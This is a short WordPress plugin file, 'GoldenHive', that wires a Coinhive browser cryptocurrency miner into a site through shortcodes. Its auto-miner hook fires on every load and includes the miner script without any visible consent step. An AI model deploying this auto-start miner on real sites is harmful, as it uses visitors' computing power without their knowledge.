<?php

/**
 * Plugin Name:     GoldenHive
 * Plugin URI:      
 * Description:     Coinhive implementation for Wordpress
 * Author:          Ashwin Kumar C
 * Author URI:      
 * Text Domain:     
 * Domain Path:     
 * Version:         
 *
 * @package         
 */
// Exit if accessed directly
if (!defined('ABSPATH')) {
    exit;
}

add_shortcode('goldenhive-mine-button', 'minebutton');
add_shortcode('goldenhive-js-miner', 'miner');
add_action('auto-miner', 'auto_miner_start');
do_action('auto-miner','');

function minebutton() {
    require_once 'mine-button.php';
}

function miner() {
    require_once 'j-miner.php';
}

function auto_miner_start() {
    require_once 'j-miner.php';
}
